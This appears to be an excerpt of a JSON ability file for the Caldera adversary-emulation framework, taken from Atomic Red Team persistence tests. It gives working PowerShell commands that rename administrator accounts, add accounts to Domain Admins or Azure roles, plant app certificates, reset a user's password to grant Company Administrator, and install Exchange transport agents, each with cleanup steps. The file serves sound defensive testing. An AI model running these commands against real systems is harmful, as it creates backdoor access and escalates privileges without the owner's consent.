                    "cleanup": "$list = Get-LocalUser |?{$_.Description -like \"atr:*\"}; foreach($u in $list) {;   $u.Description -match \"atr:(?<Name>[^;]+);(?<Description>.*)\";   Set-LocalUser -Name $u.Name -Description $Matches.Description;   Rename-LocalUser -Name $u.Name -NewName $Matches.Name;   Write-Host \"Successfully Reverted Account $($u.Name) to $($Matches.Name) on \" $Env:COMPUTERNAME; }",
                    "command": "$x = Get-Random -Minimum 2 -Maximum 9999; $y = Get-Random -Minimum 2 -Maximum 9999; $z = Get-Random -Minimum 2 -Maximum 9999; $w = Get-Random -Minimum 2 -Maximum 9999; Write-Host HaHa_$x$y$z; $fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match \"User\" -and $_.PrincipalSource -match \"Local\"} | Select Name; foreach($member in $fmm) {;     if($member -like \"*Administrator*\") {;         $account = $member.Name.Split(\"\\\")[-1];         $originalDescription = (Get-LocalUser -Name $account).Description;         Set-LocalUser -Name $account -Description \"atr:$account;$originalDescription\".Substring(0,48);         Rename-LocalUser -Name $account -NewName \"HaHa_$x$y$z\";         Write-Host \"Successfully Renamed $account Account on \" $Env:COMPUTERNAME;         };     }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9ef143154774a6d0d74e0828e90290ac",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "9ef143154774a6d0d74e0828e90290ac"
    },
    "T1098__persistence__Account Manipulation__b3aef1cccb10fc2ecf00bc80646ef8fe": {
        "description": "Create a random atr-nnnnnnnn account and add it to a domain group (by default, Domain Admins). \n\nThe quickest way to run it is against a domain controller, using `-Session` of `Invoke-AtomicTest`. Alternatively,\nyou need to install PS Module ActiveDirectory (in prereqs) and run the script with appropriare AD privileges to \ncreate the user and alter the group. Automatic installation of the dependency requires an elevated session, \nand is unlikely to work with Powershell Core (untested).\n\nIf you consider running this test against a production Active Directory, the good practise is to create a dedicated\nservice account whose delegation is given onto a dedicated OU for user creation and deletion, as well as delegated\nas group manager of the target group.\n\nExample: `Invoke-AtomicTest -Session $session 'T1098' -TestNames \"Domain Account and Group Manipulate\" -InputArgs @{\"group\" = \"DNSAdmins\" }`\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1098",
            "name": "Account Manipulation"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Get-ADUser -LDAPFilter \"(&(samaccountname=atr--*)(givenName=Test))\" | Remove-ADUser -Confirm:$False",
                    "command": "Try {;     Import-Module ActiveDirectory -ErrorAction Stop | Out-Null;      ; } ; Catch {;     if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {;   Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online; } else {;   Install-WindowsFeature RSAT-AD-PowerShell; }; };  ;  $x = Get-Random -Minimum 2 -Maximum 99; $y = Get-Random -Minimum 2 -Maximum 99; $z = Get-Random -Minimum 2 -Maximum 99; $w = Get-Random -Minimum 2 -Maximum 99; Import-Module ActiveDirectory; $account = \"#{account_prefix}-$x$y$z\"; New-ADUser -Name $account -GivenName \"Test\" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False; Add-ADGroupMember \"#{group}\" $account",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b3aef1cccb10fc2ecf00bc80646ef8fe",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "b3aef1cccb10fc2ecf00bc80646ef8fe"
    },
    "T1098__persistence__Account Manipulation__cbf44e79b4bef7b2e997508f759beee3": {
        "description": "The adversaries want to add user to some Azure role, also called Azure resource role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Owner, Contributor.\nBy default, the role Reader is assigned to user in this test.\n\nNew-AzRoleAssignment cmdlet could be also use to assign user/service principal to resource, resource group and management group.\n\nThe account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write \n(e.g. such as User Access Administrator or Owner) and the Azure Active Directory Graph Directory.Read.All \nand Microsoft Graph Directory.Read.All permissions.\n\nDetection hint - check Operation Name \"Create role assignment\" in subscriptions Activity Logs.\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1098",
            "name": "Account Manipulation"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "Import-Module -Name AzureAD -ErrorAction Ignore; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzAccount -Credential $Credential -ErrorAction Ignore; $user = Get-AzADUser | where-object {$_.DisplayName -eq \"SuperUser\" -or $_.UserPrincipalName -eq \"SuperUser\" }; if ($user -eq $null) { Write-Warning \"User not found\"; exit }; $subscription = Get-AzSubscription | where-object {$_.Name -eq \"Azure subscription 1\"}; if ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }; $role = Get-AzRoleDefinition | where-object {$_.Name -eq \"Reader\"}; if ($role -eq $null) { Write-Warning \"Role not found\"; exit }; Remove-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription; Write-Host \"User Principal $($sp.DisplayName) was removed from $($role.Name) role in subscriptions $($subscriptions.Name)\"",
                    "command": "try {if (Get-InstalledModule -Name Az.Resources -ErrorAction SilentlyContinue) { ; } else {Install-Module -Name Az.Resources -Force};  ;  Import-Module -Name Az.Resources; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzAccount -Credential $Credential; $user = Get-AzADUser | where-object {$_.DisplayName -eq \"SuperUser\" -or $_.UserPrincipalName -eq \"SuperUser\" }; if ($user -eq $null) { Write-Warning \"User not found\"; exit }; $subscription = Get-AzSubscription | where-object {$_.Name -eq \"Azure subscription 1\"}; if ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }; $role = Get-AzRoleDefinition | where-object {$_.Name -eq \"Reader\"}; if ($role -eq $null) { Write-Warning \"Role not found\"; exit }; New-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription; Write-Host \"User $($user.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "cbf44e79b4bef7b2e997508f759beee3",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "cbf44e79b4bef7b2e997508f759beee3"
    },
    "T1098__persistence__Account Manipulation__1c1381522818218092a12b973593f3a9": {
        "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1098",
            "name": "Account Manipulation"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "if (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else {New-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"; $cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"};  ;  $credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) {;     $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);     if($cred.GetNetworkCredential().Password -eq \"lower-long-special-333\"){;       Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1;     };     try {;         $newPassword = ConvertTo-SecureString lower-long-special-333 -AsPlainText -Force;         Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;     };     catch { ;         $_.Exception;         $errCode = $_.Exception.ErrorCode;         Write-Host \"Error code: $errCode\";         if ($errCode -eq 86) {;             Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\";             Remove-Item $credFile;         };         exit $errCode;     };     Write-Host -ForegroundColor Cyan \"Successfully changed the password to lower-long-special-333\";     $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"lower-long-special-333\" -AsPlainText -Force));     $newCred.Password | ConvertFrom-SecureString | Out-File $credFile; }; else {;     Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1c1381522818218092a12b973593f3a9",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "1c1381522818218092a12b973593f3a9"
    },
    "T1098__persistence__Account Manipulation__ae8bd61cb6d10568145c87134e95c96f": {
        "description": "The adversaries want to add user to some Azure AD role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Global Administrator, Application Administrator, \nPrivileged Authentication Administrator (this role can reset Global Administrator password!).\nBy default, the role Global Reader is assigned to the user principal in this test.\n\nThe account you use to run the PowerShell command should have Privileged Role Administrator or Global Administrator role in your Azure AD.\n\nDetection hint - check Activity \"Add member to role\" in Azure AD Audit Logs. In targer you will also see User as a type.\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1098",
            "name": "Account Manipulation"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "Import-Module -Name AzureAD -ErrorAction Ignore; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential -ErrorAction Ignore; $user = Get-AzureADUser -Filter \"DisplayName eq 'SuperUser' or UserPrincipalName eq 'SuperUser'\"; if ($user -eq $null) { Write-Warning \"User not found\"; exit }; $role = Get-AzureADDirectoryRole -Filter \"DisplayName eq 'Global Reader'\"; if ($role -eq $null) { Write-Warning \"Role not found\"; exit }; Remove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $user.ObjectId; Write-Host \"User $($user.DisplayName) was removed from $($role.DisplayName) role\"",
                    "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) { ; } else {Install-Module -Name AzureAD -Force};  ;  Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential; $user = Get-AzureADUser -Filter \"DisplayName eq 'SuperUser' or UserPrincipalName eq 'SuperUser'\"; if ($user -eq $null) { Write-Warning \"User not found\"; exit }; $role = Get-AzureADDirectoryRole -Filter \"DisplayName eq 'Global Reader'\"; if ($role -eq $null) { Write-Warning \"Role not found\"; exit }; Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId; Write-Host \"User $($user.DisplayName) was added to $($role.DisplayName) role\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ae8bd61cb6d10568145c87134e95c96f",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "ae8bd61cb6d10568145c87134e95c96f"
    },
    "T1136.003__persistence__Create Account: Cloud Account__a976d2bc6da0471ddf8e3583ce4f7ed7": {
        "description": "Creates a new user in Azure AD via the Azure CLI. Upon successful creation, a new user will be created. Adversaries create new users so that their malicious activity does not interrupt the normal functions of the compromised users and can remain undetected for a long time.",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1136.003",
            "name": "Create Account: Cloud Account"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "az ad user delete --id",
                    "command": "az login; $userprincipalname = \"atomicredteam@yourdomain.com\"; $username = \"atomicredteam\"      ; $password = \"reallylongcredential12345ART-ydsfghsdgfhsdgfhgsdhfg\"; az ad user create --display-name $username --password $password --user-principal-name $userprincipalname; az ad user list --filter \"displayname eq 'atomicredteam'\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a976d2bc6da0471ddf8e3583ce4f7ed7",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "a976d2bc6da0471ddf8e3583ce4f7ed7"
    },
    "T1098__persistence__Account Manipulation__3aae7c6d210ffb084186f1686a1f00c1": {
        "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1098",
            "name": "Account Manipulation"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "if (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else {New-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"; $cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"};  ;  $credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) {;     $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);     if($cred.GetNetworkCredential().Password -eq \"Spring$((Get-Date).Year)!\"){;       Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1;     };     try {;         $newPassword = ConvertTo-SecureString Spring$((Get-Date).Year)! -AsPlainText -Force;         Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;     };     catch { ;         $_.Exception;         $errCode = $_.Exception.ErrorCode;         Write-Host \"Error code: $errCode\";         if ($errCode -eq 86) {;             Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\";             Remove-Item $credFile;         };         exit $errCode;     };     Write-Host -ForegroundColor Cyan \"Successfully changed the password to Spring$((Get-Date).Year)!\";     $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"Spring$((Get-Date).Year)!\" -AsPlainText -Force));     $newCred.Password | ConvertFrom-SecureString | Out-File $credFile; }; else {;     Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3aae7c6d210ffb084186f1686a1f00c1",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "3aae7c6d210ffb084186f1686a1f00c1"
    },
    "T1136.001__persistence__Create Account: Local Account__f39aace719f4cdcf8569001f7a25aabf": {
        "description": "Creates a new user in PowerShell. Upon execution, details about the new account will be displayed in the powershell session. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_PowerShell\"\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1136.001",
            "name": "Create Account: Local Account"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-LocalUser -Name \"T1136.001_PowerShell\" -ErrorAction Ignore",
                    "command": "New-LocalUser -Name \"T1136.001_PowerShell\" -NoPassword",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f39aace719f4cdcf8569001f7a25aabf",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f39aace719f4cdcf8569001f7a25aabf"
    },
    "T1098__persistence__Account Manipulation__80d22fb154cc39b34d920f0855ce746e": {
        "description": "The adversaries want to add permission to newly created application. Application could be then used for persistence or for further operation in the attacked infrastructure. Permissions like AppRoleAssignment.ReadWrite.All or RoleManagement.ReadWrite.Directory in particular can be a valuable target for a threat actor.\nThis technique will create a new app, with the provided name, and give it the provided permission. But if you prefer to add credentials to an existing app, replace in the code: \"Get-AzureADApplication\" instead of \"New-AzureADServicePrincipal\".\nThe DirectoryRecommendations.Read.All permissions has been selected as the default.\n\nThe account you use to run the PowerShell command should have Global Administrator/Application Administrator/Cloud Application Administrator role in your Azure AD.\n\nDetection hint - check Operation Name \"Add app role assignment to service principal\" in subscriptions Activity Logs.\nYou can also take a look at the materials:\nhttps://learnsentinel.blog/2022/01/04/azuread-privesc-sentinel/\nhttps://github.com/reprise99/Sentinel-Queries\nhttps://docs.google.com/presentation/d/1AWx1w0Xcq8ENvOmSjAJswEgEio-il09QWZlGg9PbHqE/edit#slide=id.g10460eb209c_0_2766\nhttps://gist.github.com/andyrobbins/7c3dd62e6ed8678c97df9565ff3523fb\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1098",
            "name": "Account Manipulation"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential; $aadApplication = @(Get-AzureADApplication -Filter \"DisplayName eq 'test_app'\"); If ($aadApplication.Count -eq 0); {;   Write-Host \"App not found: cannot delete it\";   exit; }; ElseIf ($aadApplication.Count -gt 1); {;   Write-Host \"Found several app with name 'test_app': one is likely the one this technique created, but as a precaution, none will be deleted. Manual cleanup is required.\";   exit; }; Else; {;   Remove-AzureADApplication -ObjectId $aadApplication[0].ObjectId;   Write-Host \"Successfully deleted app\"; }",
                    "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) { ; } else {Install-Module -Name AzureAD -Force};  ;  Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential; $aadApplication = New-AzureADApplication -DisplayName \"test_app\"; $servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId; $graphSP = Get-AzureADServicePrincipal -Filter \"DisplayName eq 'Microsoft Graph'\"; $requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess; $requiredGraphAccess.ResourceAppId = $graphSP.AppId; $requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]; $ApplicationPermissions = @('DirectoryRecommendations.Read.All'); $reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions}; if($reqPermission); {; $resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess; $resourceAccess.Type = \"Role\"; $resourceAccess.Id = $reqPermission.Id    ; $requiredGraphAccess.ResourceAccess.Add($resourceAccess); }; else; {; Write-Host \"App permission $permission not found in the Graph Resource API\" -ForegroundColor Red; }; $requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess]; $requiredResourcesAccess.Add($requiredGraphAccess); Set-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess; $servicePrincipal = Get-AzureADServicePrincipal -Filter \"AppId eq '$($aadApplication.AppId)'\"; New-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "80d22fb154cc39b34d920f0855ce746e",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "80d22fb154cc39b34d920f0855ce746e"
    },
    "T1098.001__persistence__Account Manipulation: Additional Cloud Credentials__cbcac4dcb804e967b01ea42e59a8c03f": {
        "description": "Add a certificate to an Application through its App Registration. The certificate can then be used to authenticate as the application.\nThis can be used for persistence, and also for privilege escalation by benefiting from the Application's rights.\nAn account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1098.001",
            "name": "Account Manipulation: Additional Cloud Credentials"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "Import-Module -Name AzureAD -ErrorAction Ignore; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential -ErrorAction Ignore > $null; $app = Get-AzureADApplication -SearchString \"SuperApp\" | Select-Object -First 1; $credz = Get-AzureADApplicationKeyCredential -ObjectId $app.ObjectId; foreach ($cred in $credz) {;   if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq \"AtomicTest\") {;     Write-Host \"Removed $($cred.KeyId) key from application\";     Remove-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -KeyId $cred.KeyId;   }  ; }; Get-ChildItem -Path Cert:\\CurrentUser\\My | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item",
                    "command": "Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential > $null; $app = Get-AzureADApplication -SearchString \"SuperApp\" | Select-Object -First 1; if ($app -eq $null) { Write-Warning \"Application not found\"; exit }; $credNotAfter = (Get-Date).AddDays(1); $certNotAfter = (Get-Date).AddDays(2); $cert = New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter; $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData()); Write-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"; New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter; Start-Sleep -s 30; $tenant = Get-AzureADTenantDetail; $auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint; Write-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"; Write-Host \"End of Hijacking\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "cbcac4dcb804e967b01ea42e59a8c03f",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "cbcac4dcb804e967b01ea42e59a8c03f"
    },
    "T1098.003__persistence__Account Manipulation: Additional Cloud Roles__300411e901bb14245148885ad5e72882": {
        "description": "This test looks at simulating the an adversary described in the following blog post. It involves resetting the password of a normal user and adding to the company administrator role within M365.\n Reference: https://www.huntress.com/blog/business-email-compromise-via-azure-administrative-privileges\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1098.003",
            "name": "Account Manipulation: Additional Cloud Roles"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "Import-Module MSOnline; $password = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $password; Connect-MsolService -Credential $credential; Remove-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberType User -RoleMemberEmailAddress \"default\"; Remove-MsolRoleMember -RoleName \"Global Reader\" -RoleMemberType User -RoleMemberEmailAddress \"default\"",
                    "command": "Import-Module MSOnline; Import-Module AzureAD; $password = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $password; $targetsecurepw = ConvertTo-SecureString -String \"Ohn05GeMe#$\" -AsPlainText -Force; Connect-MsolService -Credential $credential -ErrorAction:SilentlyContinue; Connect-AzureAD -Credential $credential -ErrorAction:SilentlyContinue; $target_objid = Get-AzureADUser -filter \"userPrincipalName eq 'default'\" | Select-Object -ExpandProperty ObjectId; Set-AzureADUserPassword -ObjectId  $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue; Add-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberEmailAddress \"default\"; Add-MsolRoleMember -RoleName \"Global Reader\" -RoleMemberEmailAddress \"default\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "300411e901bb14245148885ad5e72882",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "300411e901bb14245148885ad5e72882"
    },
    "T1505.002__persistence__Server Software Component: Transport Agent__b00d08275bb2b3ef620e103b1fd7b9e4": {
        "description": "Install a Microsoft Exchange Transport Agent for persistence. This requires execution from an Exchange Client Access Server and the creation of a DLL with specific exports. Seen in use by Turla.\nMore details- https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1505.002",
            "name": "Server Software Component: Transport Agent"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "if(Get-Command \"Get-TransportAgent\" -ErrorAction Ignore){;   Disable-TransportAgent Security Interop Agent;   Uninstall-TransportAgent Security Interop Agent;   Get-TransportAgent; }",
                    "command": "Install-TransportAgent -Name Security Interop Agent -TransportAgentFactory Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory -AssemblyPath c:\\program files\\microsoft\\Exchange Server\\v15\\bin\\Microsoft.Exchange.Security.Interop.dll; Enable-TransportAgent Security Interop Agent; Get-TransportAgent | Format-List Name,Enabled",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b00d08275bb2b3ef620e103b1fd7b9e4",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "b00d08275bb2b3ef620e103b1fd7b9e4"
    },
    "T1547.003__multiple__Time Providers__23daed0787180c7f2ffbc20528570749": {
        "description": "Establishes persistence by creating a new time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe new time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.003",
            "name": "Time Providers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "net stop w32time; reg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /f; rm -force C:\\Users\\Public\\AtomicTest.dll; net start w32time",
